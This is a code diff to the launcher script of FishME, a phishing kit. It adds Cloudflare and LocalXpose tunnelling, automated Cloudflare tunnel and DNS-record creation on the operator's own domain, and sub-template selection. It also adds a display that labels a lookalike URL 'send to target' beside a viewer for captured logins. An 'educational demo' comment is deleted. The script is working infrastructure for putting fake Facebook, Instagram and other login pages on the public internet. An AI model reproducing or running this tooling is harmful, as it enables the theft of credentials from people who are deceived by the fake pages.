@@ -19,13 +19,32 @@ SITES_ROOT="${BASE_DIR}/templates"
 GITHUB_REPO="https://github.com/syed-sameer-ul-hassan/FishME"
 GITHUB_BRANCH="main"
 
+source "${BASE_DIR}/lib/config_loader.sh" 2>/dev/null || true
+source "${BASE_DIR}/lib/logger.sh" 2>/dev/null || true
+source "${BASE_DIR}/lib/template_manager.sh" 2>/dev/null || true
+source "${BASE_DIR}/lib/export_manager.sh" 2>/dev/null || true
+source "${BASE_DIR}/lib/analytics.sh" 2>/dev/null || true
+source "${BASE_DIR}/lib/session_manager.sh" 2>/dev/null || true
+source "${BASE_DIR}/lib/template_generator.sh" 2>/dev/null || true
+source "${BASE_DIR}/lib/report_generator.sh" 2>/dev/null || true
+source "${BASE_DIR}/lib/multi_site_manager.sh" 2>/dev/null || true
+source "${BASE_DIR}/lib/plugin_manager.sh" 2>/dev/null || true
+
+init_config 2>/dev/null || true
+init_logging 2>/dev/null || true
+init_template_manager 2>/dev/null || true
+init_export_manager 2>/dev/null || true
+init_analytics 2>/dev/null || true
+init_session_manager 2>/dev/null || true
+init_template_generator 2>/dev/null || true
+init_report_generator 2>/dev/null || true
+init_multi_site_manager 2>/dev/null || true
+init_plugin_manager 2>/dev/null || true
+
 trap 'echo -e "\n${RED}[!]${RESET} Interrupted."; exit 0' SIGINT
 
-# Generate a convincing phishing-style URL for educational demo
-# Format: sitename.com-[long random alphanumeric]
 generate_phish_url() {
     local site="$1"
-    # Map site names to realistic domain bases
     case "${site,,}" in
         facebook)  local base="facebook.com" ;;
         instagram) local base="instagram.com" ;;
@@ -40,7 +59,6 @@ generate_phish_url() {
         deviantart)local base="deviantart.com" ;;
         *)         local base="${site}.com" ;;
     esac
-    # Generate long random alphanumeric suffix — 60 chars + 40 chars with dot separator
     local chars="abcdefghijklmnopqrstuvwxyz0123456789"
     local rand1="" rand2=""
     for i in $(seq 1 48); do
@@ -49,8 +67,40 @@ generate_phish_url() {
     for i in $(seq 1 16); do
         rand2+="${chars:RANDOM%${#chars}:1}"
     done
-    # Format: sitename.com-[48chars].[16chars].page.dev
     echo "${base}-${rand1}.${rand2}.page.dev"
+}
+
+get_site_json_field() {
+    local site="$1"
+    local field="$2"
+    
+    # If site contains path separator (sub-template), use the full path
+    local site_path
+    if [[ "$site" == */* ]]; then
+        site_path="${SITES_ROOT}/${site}"
+    else
+        site_path="${SITES_ROOT}/${site}"
+    fi
+    
+    php -r "
+        \$file = '${site_path}/site.json';
+        if (!is_file(\$file)) exit(1);
+        \$data = json_decode(file_get_contents(\$file), true);
+        if (!is_array(\$data) || !isset(\$data['${field}'])) exit(1);
+        echo \$data['${field}'];
+    " 2>/dev/null
+}
+
+get_site_allocated_url() {
+    local site="$1"
+    local allocated
+    allocated=$(get_site_json_field "$site" "allocated_url")
+    if [[ -n "$allocated" ]]; then
+        echo "$allocated"
+        return 0
+    fi
+    # Use generate_allocated_url from template_manager.sh instead
+    generate_allocated_url "$site"
 }
 
 check_cloudflared() {
@@ -80,6 +130,317 @@ install_cloudflared() {
         echo -e "  ${RED}[!]${RESET} Failed to download cloudflared."
         return 1
     fi
+}
+
+check_loclx() {
+    if command -v loclx &>/dev/null; then
+        return 0
+    fi
+    [[ -x "${BASE_DIR}/loclx" ]]
+}
+
+cloudflare_login() {
+    echo -e "  ${CYAN}[i]${RESET} Cloudflare Account Login"
+    echo -e "  ${DIM}Get your API token from: https://dash.cloudflare.com/profile/api-tokens${RESET}"
+    echo -e "  ${DIM}Required permissions: Zone - Zone - Read, Account - Account Settings - Read${RESET}"
+    echo
+    read -p "  ${CYAN}[?]${RESET} Enter Cloudflare API Token: " cf_token
+    echo
+    
+    if [[ -z "$cf_token" ]]; then
+        echo -e "  ${RED}[!]${RESET} No token provided."
+        return 1
+    fi
+    if [[ ! "$cf_token" =~ ^[A-Za-z0-9_-]+$ ]]; then
+        echo -e "  ${RED}[!]${RESET} Invalid token format. Token should only contain alphanumeric characters, underscores, and hyphens."
+        return 1
+    fi
+    echo -e "  ${DIM}[~]${RESET} Validating token..."
+    local response
+    response=$(curl -s -w "\n%{http_code}" -X GET "https://api.cloudflare.com/client/v4/zones" \
+        -H "Authorization: Bearer $cf_token" \
+        -H "Content-Type: application/json" 2>/dev/null)
+    
+    local http_code
+    http_code=$(echo "$response" | tail -n1)
+    response=$(echo "$response" | head -n-1)
+    
+    if [[ "$http_code" == "200" ]] && echo "$response" | grep -q '"success":true'; then
+        echo -e "  ${GREEN}[+]${RESET} Authentication successful!"
+        echo "$cf_token" > "${BASE_DIR}/.cf_token"
+        chmod 600 "${BASE_DIR}/.cf_token"
+        return 0
+    else
+        echo -e "  ${RED}[!]${RESET} Authentication failed."
+        echo -e "  ${DIM}HTTP Status: ${http_code}${RESET}"
+        
+        # Parse error message from response
+        local error_msg
+        error_msg=$(echo "$response" | grep -oP '"message":"[^"]+"' | cut -d'"' -f4 | head -1)
+        
+        if [[ -n "$error_msg" ]]; then
+            echo -e "  ${DIM}Error: ${error_msg}${RESET}"
+        fi
+        
+        if [[ "$http_code" == "401" ]]; then
+            echo -e "  ${DIM}Tip: Make sure your token has the correct permissions:${RESET}"
+            echo -e "  ${DIM}  - Zone - Zone - Read${RESET}"
+            echo -e "  ${DIM}  - Account - Account Settings - Read${RESET}"
+        fi
+        
+        return 1
+    fi
+}
+
+cloudflare_list_domains() {
+    local cf_token_file="${BASE_DIR}/.cf_token"
+    if [[ ! -f "$cf_token_file" ]]; then
+        echo -e "  ${RED}[!]${RESET} Not logged in. Please login first."
+        return 1
+    fi
+    
+    local cf_token
+    cf_token=$(cat "$cf_token_file")
+    
+    local response
+    response=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones?per_page=100" \
+        -H "Authorization: Bearer $cf_token" \
+        -H "Content-Type: application/json" 2>/dev/null)
+    
+    if ! echo "$response" | grep -q '"success":true'; then
+        echo -e "  ${RED}[!]${RESET} Failed to fetch domains. Token may be invalid."
+        return 1
+    fi
+    
+    # Extract domain names
+    local domains
+    domains=$(echo "$response" | grep -oP '"name":"[^"]+"' | cut -d'"' -f4 | sort)
+    
+    if [[ -z "$domains" ]]; then
+        echo -e "  ${RED}[!]${RESET} No domains found in your account."
+        return 1
+    fi
+    
+    echo "$domains"
+    return 0
+}
+
+cloudflare_select_domain() {
+    local cf_token_file="${BASE_DIR}/.cf_token"
+    if [[ ! -f "$cf_token_file" ]]; then
+        echo -e "  ${RED}[!]${RESET} Not logged in. Please login first."
+        return 1
+    fi
+    
+    local domains
+    domains=$(cloudflare_list_domains)
+    if [[ $? -ne 0 ]]; then
+        return 1
+    fi
+    
+    echo
+    echo -e "${CYAN}══════════════════════════════════════════════════════════════${RESET}"
+    echo -e "${CYAN}         SELECT DOMAIN FOR TUNNEL         ${RESET}"
+    echo -e "${CYAN}══════════════════════════════════════════════════════════════${RESET}"
+    echo
+    
+    local i=1
+    local domain_array=()
+    while IFS= read -r domain; do
+        domain_array+=("$domain")
+        printf "  ${GREEN}%-3s${RESET}  ${BOLD}%-40s${RESET}\n" "[$i]" "$domain"
+        ((i++))
+    done <<< "$domains"
+    
+    echo
+    echo -e "${CYAN}──────────────────────────────────────────────────────────────${RESET}"
+    read -p "  ${CYAN}[?]${RESET} Enter option number: " opt
+    
+    if [[ "${opt}" =~ ^[0-9]+$ && ${opt} -ge 1 && ${opt} -le ${#domain_array[@]} ]]; then
+        SELECTED_DOMAIN="${domain_array[$((opt-1))]}"
+        SELECTED_ZONE_ID=$(cloudflare_get_zone_id "$SELECTED_DOMAIN")
+        echo -e "  ${GREEN}[+]${RESET} Selected domain: ${BOLD}${SELECTED_DOMAIN}${RESET}"
+        return 0
+    else
+        echo -e "  ${RED}[!]${RESET} Invalid option."
+        return 1
+    fi
+}
+
+cloudflare_get_zone_id() {
+    local domain="$1"
+    local cf_token_file="${BASE_DIR}/.cf_token"
+    local cf_token
+    cf_token=$(cat "$cf_token_file")
+    
+    local response
+    response=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones?name=${domain}" \
+        -H "Authorization: Bearer $cf_token" \
+        -H "Content-Type: application/json" 2>/dev/null)
+    
+    local zone_id
+    zone_id=$(echo "$response" | grep -oP '"id":"[^"]+"' | head -1 | cut -d'"' -f4)
+    
+    if [[ -n "$zone_id" ]]; then
+        echo "$zone_id"
+        return 0
+    else
+        return 1
+    fi
+}
+
+cloudflare_get_account_id() {
+    local cf_token_file="${BASE_DIR}/.cf_token"
+    local cf_token
+    cf_token=$(cat "$cf_token_file")
+    
+    local response
+    response=$(curl -s -X GET "https://api.cloudflare.com/client/v4/accounts" \
+        -H "Authorization: Bearer $cf_token" \
+        -H "Content-Type: application/json" 2>/dev/null)
+    
+    local account_id
+    account_id=$(echo "$response" | grep -oP '"id":"[^"]+"' | head -1 | cut -d'"' -f4)
+    
+    if [[ -n "$account_id" ]]; then
+        echo "$account_id"
+        return 0
+    else
+        return 1
+    fi
+}
+
+cloudflare_create_tunnel() {
+    local account_id="$1"
+    local subdomain="$2"
+    local cf_token_file="${BASE_DIR}/.cf_token"
+    local cf_token
+    cf_token=$(cat "$cf_token_file")
+    local tunnel_name="fishme-${subdomain}-$(date +%s)"
+    local response
+    response=$(curl -s -X POST "https://api.cloudflare.com/client/v4/accounts/${account_id}/tunnels" \
+        -H "Authorization: Bearer $cf_token" \
+        -H "Content-Type: application/json" \
+        --data "{\"name\":\"${tunnel_name}\"}" 2>/dev/null)
+    
+    if ! echo "$response" | grep -q '"success":true'; then
+        echo -e "  ${RED}[!]${RESET} Failed to create tunnel."
+        return 1
+    fi
+    
+    local tunnel_id
+    tunnel_id=$(echo "$response" | grep -oP '"id":"[^"]+"' | head -1 | cut -d'"' -f4)
+    
+    echo "$tunnel_id"
+    return 0
+}
+
+cloudflare_create_dns_record() {
+    local zone_id="$1"
+    local domain="$2"
+    local tunnel_id="$3"
+    local cf_token_file="${BASE_DIR}/.cf_token"
+    local cf_token
+    cf_token=$(cat "$cf_token_file")
+    local response
+    response=$(curl -s -X POST "https://api.cloudflare.com/client/v4/zones/${zone_id}/dns_records" \
+        -H "Authorization: Bearer $cf_token" \
+        -H "Content-Type: application/json" \
+        --data "{\"type\":\"CNAME\",\"name\":\"${domain}\",\"content\":\"${tunnel_id}.cfargotunnel.com\",\"ttl\":120,\"proxied\":true}" 2>/dev/null)
+    
+    if ! echo "$response" | grep -q '"success":true'; then
+        echo -e "  ${RED}[!]${RESET} Failed to create DNS record."
+        return 1
+    fi
+    
+    return 0
+}
+
+cloudflare_get_tunnel_token() {
+    local account_id="$1"
+    local tunnel_id="$2"
+    local cf_token_file="${BASE_DIR}/.cf_token"
+    local cf_token
+    cf_token=$(cat "$cf_token_file")
+    local response
+    response=$(curl -s -X GET "https://api.cloudflare.com/client/v4/accounts/${account_id}/tunnels/${tunnel_id}/token" \
+        -H "Authorization: Bearer $cf_token" \
+        -H "Content-Type: application/json" 2>/dev/null)
+    
+    if ! echo "$response" | grep -q '"success":true'; then
+        echo -e "  ${RED}[!]${RESET} Failed to get tunnel token."
+        return 1
+    fi
+    
+    local tunnel_token
+    tunnel_token=$(echo "$response" | grep -oP '"token":"[^"]+"' | cut -d'"' -f4)
+    
+    if [[ -n "$tunnel_token" ]]; then
+        echo "$tunnel_token"
+        return 0
+    else
+        return 1
+    fi
+}
+
+install_loclx() {
+    echo -e "  ${CYAN}[i]${RESET} Installing LocalXpose (loclx)..."
+    local arch url zip_path extract_dir
+    arch=$(uname -m)
+    case "$arch" in
+        x86_64)  url="https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip" ;;
+        aarch64) url="https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip" ;;
+        armv7l|armv6l) url="https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip" ;;
+        *)       echo -e "  ${RED}[!]${RESET} Unsupported architecture: $arch"; return 1 ;;
+    esac
+    zip_path=$(mktemp)
+    extract_dir=$(mktemp -d)
+    if curl -L "$url" -o "$zip_path" --progress-bar; then
+        if unzip -o -j "$zip_path" -d "$extract_dir" >/dev/null 2>&1 && [[ -f "${extract_dir}/loclx" ]]; then
+            chmod +x "${extract_dir}/loclx"
+            sudo mv "${extract_dir}/loclx" /usr/local/bin/loclx 2>/dev/null || mv "${extract_dir}/loclx" "${BASE_DIR}/loclx"
+            rm -rf "$extract_dir" "$zip_path"
+            echo -e "  ${GREEN}[+]${RESET} loclx installed successfully."
+            return 0
+        fi
+    fi
+    rm -rf "$extract_dir" "$zip_path"
+    echo -e "  ${RED}[!]${RESET} Failed to download or extract loclx."
+    return 1
+}
+
+check_loclx_auth() {
+    local lx_bin="$1"
+    local status
+    status=$("$lx_bin" account status 2>&1)
+    [[ "$status" != *"error"* && "$status" != *"Error"* ]]
+}
+
+show_tunnel_urls() {
+    local tunnel_label="$1"
+    local tunnel_url="$2"
+    local allocated_path site_name site_domain active_phish_url viewer_link
+    allocated_path=$(get_site_allocated_url "$SITE_NAME")
+    site_name=$(get_site_json_field "$SITE_NAME" "name")
+    site_domain=$(get_site_json_field "$SITE_NAME" "domain")
+    [[ -z "$site_name" ]] && site_name="$SITE_NAME"
+    [[ -z "$site_domain" ]] && site_domain="${SITE_NAME}.com"
+    active_phish_url="${tunnel_url}/${allocated_path}/"
+    viewer_link="${tunnel_url}/viewer.php"
+    echo
+    echo -e "${GREEN}══════════════════════════════════════════════════════════════${RESET}"
+    echo -e "${GREEN}         ${tunnel_label} TUNNEL ACTIVE         ${RESET}"
+    echo -e "${GREEN}══════════════════════════════════════════════════════════════${RESET}"
+    echo
+    echo -e "  ${CYAN}[i]${RESET} Site   : ${BOLD}${site_name}${RESET} ${DIM}(${site_domain})${RESET}"
+    echo
+    echo -e "  ${RED}[🎣]${RESET} ${BOLD}Main site URL (send to target):${RESET}"
+    echo -e "      ${RED}${BOLD}${site_domain}${RESET}"
+    echo
+    echo -e "  ${GREEN}[✓]${RESET} Capture viewer : ${WHITE}${BOLD}${viewer_link}${RESET}"
+    echo
+    echo -e "  ${DIM}↑ Access via: ${active_phish_url}${RESET}"
+    echo
 }
 
 banner() {
@@ -151,6 +512,26 @@ start_server() {
 
     if [[ "${opt}" =~ ^[0-9]+$ && ${opt} -ge 1 && ${opt} -le ${#SITES[@]} ]]; then
         SITE_NAME="${SITES[$((opt-1))]}"
+        
+        # Clear any previous sub-template selection
+        unset SELECTED_SUB_TEMPLATE
+        unset SUB_TEMPLATE_SELECTION_IN_PROGRESS
+        unset FINAL_SITE_NAME
+        
+        # Check for sub-templates and show selection if multiple exist
+        local sub_template
+        sub_template=$(select_sub_template "$SITE_NAME")
+        
+        if [[ "$sub_template" != "main" ]]; then
+            SITE_NAME="${SITE_NAME}/${sub_template}"
+            echo -e "${GREEN}[+]${RESET} Selected: ${BOLD}${SITE_NAME}${RESET}"
+        else
+            echo -e "${GREEN}[+]${RESET} Selected: ${BOLD}${SITE_NAME}${RESET}"
+        fi
+        
+        # Export the final SITE_NAME to prevent re-selection
+        export FINAL_SITE_NAME="$SITE_NAME"
+        export SUB_TEMPLATE_SELECTION_COMPLETE="1"
     else
         echo -e "${RED}[!]${RESET} Invalid option. Exiting."
         exit 1
@@ -165,78 +546,223 @@ start_server() {
     fi
 
     echo
-    read -n1 -p "${CYAN}[?]${RESET} Use Cloudflare tunnel for public URL? [y/N]: " cf_ans
+    read -n1 -p "${CYAN}[?]${RESET} Use public tunnel for remote URL? [y/N]: " tunnel_ans
     echo
 
-    CF_PID=""
-    CF_URL=""
-    USE_CF=0
-    if [[ ${cf_ans,,} == "y" ]]; then
-        if ! check_cloudflared; then
-            echo -e "  ${ORANGE}[!]${RESET} cloudflared not found."
-            read -n1 -p "  ${CYAN}[?]${RESET} Install it now? [y/N]: " inst_ans
-            echo
-            if [[ ${inst_ans,,} == "y" ]]; then
-                install_cloudflared || { echo -e "  ${RED}[!]${RESET} Skipping Cloudflare tunnel."; }
-            fi
-        fi
-        if check_cloudflared; then
-            USE_CF=1
-        fi
+    TUNNEL_PID=""
+    TUNNEL_URL=""
+    TUNNEL_TYPE=""
+    SELECTED_DOMAIN=""
+    if [[ ${tunnel_ans,,} == "y" ]]; then
+        echo
+        echo -e "  ${CYAN}[1]${RESET} Cloudflare  ${DIM}(free, no account)${RESET}"
+        echo -e "  ${CYAN}[2]${RESET} Cloudflare with account  ${DIM}(use your own domain)${RESET}"
+        echo -e "  ${CYAN}[3]${RESET} LocalXpose  ${DIM}(requires loclx account)${RESET}"
+        read -p "  ${CYAN}[?]${RESET} Select tunnel [1/2/3]: " tunnel_opt
+        echo
+
+        case "$tunnel_opt" in
+            1)
+                if ! check_cloudflared; then
+                    echo -e "  ${ORANGE}[!]${RESET} cloudflared not found."
+                    read -n1 -p "  ${CYAN}[?]${RESET} Install it now? [y/N]: " inst_ans
+                    echo
+                    if [[ ${inst_ans,,} == "y" ]]; then
+                        install_cloudflared || { echo -e "  ${RED}[!]${RESET} Skipping Cloudflare tunnel."; }
+                    fi
+                fi
+                if check_cloudflared; then
+                    TUNNEL_TYPE="cloudflare"
+                fi
+                ;;
+            2)
+                if ! check_cloudflared; then
+                    echo -e "  ${ORANGE}[!]${RESET} cloudflared not found."
+                    read -n1 -p "  ${CYAN}[?]${RESET} Install it now? [y/N]: " inst_ans
+                    echo
+                    if [[ ${inst_ans,,} == "y" ]]; then
+                        install_cloudflared || { echo -e "  ${RED}[!]${RESET} Skipping Cloudflare tunnel."; }
+                    fi
+                fi
+                if check_cloudflared; then
+                    # Check if logged in
+                    if [[ ! -f "${BASE_DIR}/.cf_token" ]]; then
+                        echo -e "  ${ORANGE}[!]${RESET} Not logged in to Cloudflare."
+                        read -n1 -p "  ${CYAN}[?]${RESET} Login now? [y/N]: " login_ans
+                        echo
+                        if [[ ${login_ans,,} == "y" ]]; then
+                            cloudflare_login || { echo -e "  ${RED}[!]${RESET} Skipping Cloudflare tunnel."; }
+                        fi
+                    fi
+                    if [[ -f "${BASE_DIR}/.cf_token" ]]; then
+                        # Select domain
+                        if cloudflare_select_domain; then
+                            TUNNEL_TYPE="cloudflare_account"
+                        else
+                            echo -e "  ${RED}[!]${RESET} Domain selection failed. Skipping tunnel."
+                        fi
+                    else
+                        echo -e "  ${RED}[!]${RESET} Skipping Cloudflare tunnel (not logged in)."
+                    fi
+                fi
+                ;;
+            3)
+                if ! check_loclx; then
+                    echo -e "  ${ORANGE}[!]${RESET} loclx not found."
+                    read -n1 -p "  ${CYAN}[?]${RESET} Install it now? [y/N]: " inst_ans
+                    echo
+                    if [[ ${inst_ans,,} == "y" ]]; then
+                        install_loclx || { echo -e "  ${RED}[!]${RESET} Skipping LocalXpose tunnel."; }
+                    fi
+                fi
+                if check_loclx; then
+                    local lx_bin
+                    lx_bin=$(command -v loclx 2>/dev/null || echo "${BASE_DIR}/loclx")
+                    if ! check_loclx_auth "$lx_bin"; then
+                        echo -e "  ${ORANGE}[!]${RESET} LocalXpose is not authenticated."
+                        echo -e "  ${DIM}    Get your access token at: https://localxpose.io/dashboard/access${RESET}"
+                        read -n1 -p "  ${CYAN}[?]${RESET} Login now? [y/N]: " login_ans
+                        echo
+                        if [[ ${login_ans,,} == "y" ]]; then
+                            "$lx_bin" account login || echo -e "  ${RED}[!]${RESET} Login failed."
+                        fi
+                    fi
+                    if check_loclx_auth "$lx_bin"; then
+                        TUNNEL_TYPE="localxpose"
+                    else
+                        echo -e "  ${RED}[!]${RESET} Skipping LocalXpose tunnel (not authenticated)."
+                    fi
+                fi
+                ;;
+            *)
+                echo -e "  ${RED}[!]${RESET} Invalid tunnel option. Continuing without tunnel."
+                ;;
+        esac
     fi
 
-    echo -e "\n${GREEN}[+]${RESET} Starting FishMe server..."
-    echo -e "${CYAN}[-]${RESET} Site    : ${BOLD}${SITE_NAME}${RESET}"
-    echo -e "${CYAN}[-]${RESET} Local   : ${BOLD}http://${HOST}:${PORT}/templates/${SITE_NAME}/${RESET}"
-    echo -e "${CYAN}[-]${RESET} Viewer  : ${BOLD}http://${HOST}:${PORT}/viewer.php${RESET}"
-
-    # Start PHP server using router.php so phishing-path URLs work
+    local allocated_path
+    allocated_path=$(get_site_allocated_url "$SITE_NAME")
     cd "${BASE_DIR}" || exit 1
     FISHME_ACTIVE_SITE="${SITE_NAME}" php -S "${HOST}:${PORT}" "${BASE_DIR}/router.php" >/dev/null 2>&1 &
     PHP_PID=$!
 
-    if [[ $USE_CF -eq 1 ]]; then
+    if [[ "$TUNNEL_TYPE" == "cloudflare" ]]; then
         echo -e "${CYAN}[~]${RESET} Starting Cloudflare tunnel..."
-        local cf_log
+        local cf_log cf_bin
         cf_log=$(mktemp)
-
-        # Find cloudflared binary
-        local cf_bin
         cf_bin=$(command -v cloudflared 2>/dev/null || echo "${BASE_DIR}/cloudflared")
 
         "$cf_bin" tunnel --url "http://${HOST}:${PORT}" --logfile "$cf_log" >/dev/null 2>&1 &
-        CF_PID=$!
+        TUNNEL_PID=$!
 
-        # Wait for tunnel URL (max 15 seconds)
         local attempts=0
         while [[ $attempts -lt 30 ]]; do
-            CF_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' "$cf_log" 2>/dev/null | head -1)
-            [[ -n "$CF_URL" ]] && break
+            TUNNEL_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' "$cf_log" 2>/dev/null | head -1)
+            [[ -n "$TUNNEL_URL" ]] && break
             sleep 0.5
             ((attempts++))
         done
 
-        if [[ -n "$CF_URL" ]]; then
-            local phish_path
-            phish_path=$(generate_phish_url "$SITE_NAME")
-            local active_phish_url="${CF_URL}/${phish_path}/"
-            local viewer_link="${CF_URL}/viewer.php"
-            echo
-            echo -e "${GREEN}══════════════════════════════════════════════════════════════${RESET}"
-            echo -e "${GREEN}         CLOUDFLARE TUNNEL ACTIVE         ${RESET}"
-            echo -e "${GREEN}══════════════════════════════════════════════════════════════${RESET}"
-            echo
-            echo -e "  ${RED}[🎣]${RESET} ${BOLD}Phishing URL (send to target):${RESET}"
-            echo -e "      ${RED}${BOLD}${active_phish_url}${RESET}"
-            echo
-            echo -e "  ${GREEN}[✓]${RESET} Capture viewer : ${WHITE}${BOLD}${viewer_link}${RESET}"
-            echo -e "  ${DIM}[-]${RESET} Direct tunnel  : ${DIM}${CF_URL}/templates/${SITE_NAME}/${RESET}"
-            echo
-            echo -e "  ${DIM}↑ The red URL is ACTIVE — it redirects to the real phishing page via Cloudflare.${RESET}"
-            echo
+        if [[ -n "$TUNNEL_URL" ]]; then
+            show_tunnel_urls "CLOUDFLARE" "$TUNNEL_URL"
         else
-            echo -e "  ${RED}[!]${RESET} Could not get tunnel URL. Check network and try again."
+            echo -e "  ${RED}[!]${RESET} Could not get Cloudflare tunnel URL. Check network and try again."
+            echo -e "\n${GREEN}[+]${RESET} Starting FishMe server..."
+            echo -e "${CYAN}[-]${RESET} Site    : ${BOLD}${SITE_NAME}${RESET}"
+            echo -e "${CYAN}[-]${RESET} Main URL: ${BOLD}http://${HOST}:${PORT}/${allocated_path}/${RESET}"
+            echo -e "${CYAN}[-]${RESET} Local   : ${BOLD}http://${HOST}:${PORT}/templates/${SITE_NAME}/${RESET}"
+            echo -e "${CYAN}[-]${RESET} Viewer  : ${BOLD}http://${HOST}:${PORT}/viewer.php${RESET}"
         fi
+    elif [[ "$TUNNEL_TYPE" == "cloudflare_account" ]]; then
+        echo -e "${CYAN}[~]${RESET} Setting up Cloudflare tunnel on ${BOLD}${SELECTED_DOMAIN}${RESET}..."
+        
+        # Get account ID
+        local account_id
+        account_id=$(cloudflare_get_account_id)
+        if [[ $? -ne 0 ]]; then
+            echo -e "  ${RED}[!]${RESET} Failed to get Cloudflare account ID."
+            echo -e "\n${GREEN}[+]${RESET} Starting FishMe server..."
+            echo -e "${CYAN}[-]${RESET} Site    : ${BOLD}${SITE_NAME}${RESET}"
+            echo -e "${CYAN}[-]${RESET} Main URL: ${BOLD}http://${HOST}:${PORT}/${allocated_path}/${RESET}"
+            echo -e "${CYAN}[-]${RESET} Local   : ${BOLD}http://${HOST}:${PORT}/templates/${SITE_NAME}/${RESET}"
+            echo -e "${CYAN}[-]${RESET} Viewer  : ${BOLD}http://${HOST}:${PORT}/viewer.php${RESET}"
+        else
+            # Create tunnel
+            local tunnel_id
+            tunnel_id=$(cloudflare_create_tunnel "$account_id" "$SITE_NAME")
+            if [[ $? -ne 0 ]]; then
+                echo -e "  ${RED}[!]${RESET} Failed to create Cloudflare tunnel."
+                echo -e "\n${GREEN}[+]${RESET} Starting FishMe server..."
+                echo -e "${CYAN}[-]${RESET} Site    : ${BOLD}${SITE_NAME}${RESET}"
+                echo -e "${CYAN}[-]${RESET} Main URL: ${BOLD}http://${HOST}:${PORT}/${allocated_path}/${RESET}"
+                echo -e "${CYAN}[-]${RESET} Local   : ${BOLD}http://${HOST}:${PORT}/templates/${SITE_NAME}/${RESET}"
+                echo -e "${CYAN}[-]${RESET} Viewer  : ${BOLD}http://${HOST}:${PORT}/viewer.php${RESET}"
+            else
+                # Create DNS record
+                if cloudflare_create_dns_record "$SELECTED_ZONE_ID" "$SELECTED_DOMAIN" "$tunnel_id"; then
+                    echo -e "  ${GREEN}[+]${RESET} DNS record created for ${BOLD}${SELECTED_DOMAIN}${RESET}"
+                    local tunnel_token
+                    tunnel_token=$(cloudflare_get_tunnel_token "$account_id" "$tunnel_id")
+                    if [[ $? -ne 0 ]]; then
+                        echo -e "  ${RED}[!]${RESET} Failed to get tunnel token."
+                        echo -e "\n${GREEN}[+]${RESET} Starting FishMe server..."
+                        echo -e "${CYAN}[-]${RESET} Site    : ${BOLD}${SITE_NAME}${RESET}"
+                        echo -e "${CYAN}[-]${RESET} Main URL: ${BOLD}http://${HOST}:${PORT}/${allocated_path}/${RESET}"
+                        echo -e "${CYAN}[-]${RESET} Local   : ${BOLD}http://${HOST}:${PORT}/templates/${SITE_NAME}/${RESET}"
+                        echo -e "${CYAN}[-]${RESET} Viewer  : ${BOLD}http://${HOST}:${PORT}/viewer.php${RESET}"
+                    else
+                        # Start cloudflared with tunnel token
+                        local cf_bin
+                        cf_bin=$(command -v cloudflared 2>/dev/null || echo "${BASE_DIR}/cloudflared")
+                        "$cf_bin" tunnel --token "$tunnel_token" >/dev/null 2>&1 &
+                        TUNNEL_PID=$!
+                        
+                        TUNNEL_URL="https://${SELECTED_DOMAIN}"
+                        show_tunnel_urls "CLOUDFLARE" "$TUNNEL_URL"
+                    fi
+                else
+                    echo -e "  ${RED}[!]${RESET} Failed to create DNS record."
+                    echo -e "\n${GREEN}[+]${RESET} Starting FishMe server..."
+                    echo -e "${CYAN}[-]${RESET} Site    : ${BOLD}${SITE_NAME}${RESET}"
+                    echo -e "${CYAN}[-]${RESET} Main URL: ${BOLD}http://${HOST}:${PORT}/${allocated_path}/${RESET}"
+                    echo -e "${CYAN}[-]${RESET} Local   : ${BOLD}http://${HOST}:${PORT}/templates/${SITE_NAME}/${RESET}"
+                    echo -e "${CYAN}[-]${RESET} Viewer  : ${BOLD}http://${HOST}:${PORT}/viewer.php${RESET}"
+                fi
+            fi
+        fi
+    elif [[ "$TUNNEL_TYPE" == "localxpose" ]]; then
+        echo -e "${CYAN}[~]${RESET} Starting LocalXpose tunnel..."
+        local lx_log lx_bin
+        lx_log=$(mktemp)
+        lx_bin=$(command -v loclx 2>/dev/null || echo "${BASE_DIR}/loclx")
+
+        "$lx_bin" tunnel --raw-mode http --https-redirect -t "${HOST}:${PORT}" >"$lx_log" 2>&1 &
+        TUNNEL_PID=$!
+
+        local attempts=0
+        while [[ $attempts -lt 30 ]]; do
+            TUNNEL_URL=$(grep -oP 'https://[-0-9a-z.]+\.loclx\.io' "$lx_log" 2>/dev/null | head -1)
+            [[ -n "$TUNNEL_URL" ]] && break
+            sleep 0.5
+            ((attempts++))
+        done
+
+        if [[ -n "$TUNNEL_URL" ]]; then
+            show_tunnel_urls "LOCALXPOSE" "$TUNNEL_URL"
+        else
+            echo -e "  ${RED}[!]${RESET} Could not get LocalXpose tunnel URL. Check network/auth and try again."
+            echo -e "\n${GREEN}[+]${RESET} Starting FishMe server..."
+            echo -e "${CYAN}[-]${RESET} Site    : ${BOLD}${SITE_NAME}${RESET}"
+            echo -e "${CYAN}[-]${RESET} Main URL: ${BOLD}http://${HOST}:${PORT}/${allocated_path}/${RESET}"
+            echo -e "${CYAN}[-]${RESET} Local   : ${BOLD}http://${HOST}:${PORT}/templates/${SITE_NAME}/${RESET}"
+            echo -e "${CYAN}[-]${RESET} Viewer  : ${BOLD}http://${HOST}:${PORT}/viewer.php${RESET}"
+        fi
+    else
+        echo -e "\n${GREEN}[+]${RESET} Starting FishMe server..."
+        echo -e "${CYAN}[-]${RESET} Site    : ${BOLD}${SITE_NAME}${RESET}"
+        echo -e "${CYAN}[-]${RESET} Main URL: ${BOLD}http://${HOST}:${PORT}/${allocated_path}/${RESET}"
+        echo -e "${CYAN}[-]${RESET} Local   : ${BOLD}http://${HOST}:${PORT}/templates/${SITE_NAME}/${RESET}"
+        echo -e "${CYAN}[-]${RESET} Viewer  : ${BOLD}http://${HOST}:${PORT}/viewer.php${RESET}"
     fi
 
     echo -e "${GREEN}[+]${RESET} Press ${BOLD}Ctrl+C${RESET} to stop."
@@ -245,7 +771,8 @@ start_server() {
     cleanup() {
         echo -e "\n${CYAN}[~]${RESET} Shutting down..."
         [[ -n "$PHP_PID" ]] && kill "$PHP_PID" 2>/dev/null
-        [[ -n "$CF_PID" ]] && kill "$CF_PID" 2>/dev/null
+        [[ -n "$TUNNEL_PID" ]] && kill "$TUNNEL_PID" 2>/dev/null
+        rm -f "${BASE_DIR}/.tunnel_token" 2>/dev/null
         echo -e "${GREEN}[+]${RESET} Done."
         exit 0
     }
